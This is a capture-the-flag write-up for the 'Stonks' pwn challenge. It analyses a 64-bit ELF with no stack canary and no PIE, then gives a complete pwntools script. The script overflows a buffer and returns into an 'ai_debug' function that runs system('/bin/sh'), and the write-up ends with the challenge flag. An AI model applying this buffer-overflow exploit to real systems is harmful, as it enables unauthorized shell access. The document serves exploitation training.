# Stonks

## Analyzing
Checking the type of the file: `file chal`
```
chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c9dd0853a3d57b88734e4b8bfc2feeff478b5b67, for GNU/Linux 3.2.0, not stripped
```

Checking what protections are enabled: `checksec chal`
```
[*] '/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

After fuzzing the application with gdb I found out that we can control the stack after 48 bytes.

I found out interesting function called `ai_debug`
It puts 0x402008 into RDI and executes `system()`. The address points to string `/bin/sh`

That is our way to pwn the challenge. 

## Exploiting
1. First we need to send 40 bytes of junk, because string `/bin/sh` is 8 bytes. 
2. Send a simple return address to align the stack.
3. Call ai_debug function to gain shell. 

Exploit code

```python
from pwn import *

#Settings
filename = "chal"
remoteOn = True
junk = b"A"*40
def start(elf, ssh=False, libc=None):
    if remoteOn:
        if ssh:
            s = ssh(host="", user="", password="")
            return [s.process(), libc]
        else:
            return [remote("stonks.hsc.tf", 1337), libc]
    else:
        return [elf.process(), '/lib/x86_64-linux-gnu/libc.so.6']


#Start the processes.
elf = ELF(filename)
r = start(elf)[0]
if start(elf)[1] is not None:
    libc = ELF(start(elf)[1])
rop = ROP(elf)

#Base gadgets
ret_addr = (rop.find_gadget(['ret']))[0] # Base return address
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # pop rdi; ret
log.info(f"pop rdi @ {hex(pop_rdi)}")
log.info(f"return address @ {hex(ret_addr)}")

ai_debug = elf.symbols["ai_debug"]
log.info(f"ai_debug @ {hex(ai_debug)}")

payload = junk
payload += p64(ret_addr)
payload += p64(ai_debug)


r.sendafter("Please enter the stock ticker symbol: ", payload)
r.interactive()

```

## Flag
flag{to_the_moon}